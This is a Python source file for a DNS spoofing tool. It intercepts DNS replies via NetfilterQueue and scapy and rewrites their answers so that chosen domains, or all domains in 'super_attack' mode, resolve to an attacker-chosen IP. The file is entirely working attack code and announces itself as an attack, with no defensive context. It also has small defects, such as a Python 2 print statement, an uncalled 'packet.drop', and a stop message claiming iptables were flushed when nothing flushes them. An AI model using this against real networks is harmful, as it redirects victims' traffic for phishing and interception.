# DNS Spoofing
import os

from scapy.arch import get_if_addr
from scapy.config import conf
from scapy.layers.dns import DNSQR, DNS, DNSRR
from scapy.layers.inet import IP, UDP
from netfilterqueue import NetfilterQueue


class DnsSpoof:
    queue = NetfilterQueue()
    interface = conf.iface
    dns_host = None
    continueRunning = True
    my_ip = ''
    super_attack = False
    spoof_ip = ''

    def __init__(self, iface, sa, dns_dic):
        self.interface = iface
        self.my_ip = get_if_addr(self.interface)
        self.super_attack = sa
        if self.super_attack:
            self.spoof_ip = dns_dic
        else:
            self.dns_host = dns_dic
                #{b"neverssl.com.": self.my_ip,
                      #   b"www.google.com.": "34.240.160.162"}

    def start(self, queue_num):
        try:
            print("[*] Started DNS spoofing attack [CTRL-C to stop]")
            print str(self.dns_host)

            self.queue.bind(queue_num, self.process_packet)
            self.queue.run()
        except KeyboardInterrupt:
            self.stop()

    def process_packet(self, packet):
        if not self.continueRunning:
            packet.drop
            return
        spacket = IP(packet.get_payload())
        if spacket.haslayer(DNSRR):
            print("[Before]: " + str(spacket.summary()))
            try:
                spacket = self.modify_packet(spacket)
            except IndexError:
                pass
            print("[After ]: " + str(spacket.summary()))
            packet.set_payload(bytes(spacket))
        packet.accept()

    def modify_packet(self, packet):
        domain_name = packet[DNSQR].qname
        if self.super_attack:
            packet[DNS].an = DNSRR(rrname=domain_name, rdata=self.spoof_ip)
            packet[DNS].ancount = 1

            del packet[IP].len
            del packet[IP].chksum
            del packet[UDP].len
            del packet[UDP].chksum

        elif domain_name in self.dns_host:
            packet[DNS].an = DNSRR(rrname=domain_name, rdata=self.dns_host[domain_name])
            packet[DNS].ancount = 1

            del packet[IP].len
            del packet[IP].chksum
            del packet[UDP].len
            del packet[UDP].chksum

        return packet

    def stop(self):
        self.queue.unbind()
        print("[*] DNS Spoof Stopped. Iptables flushed")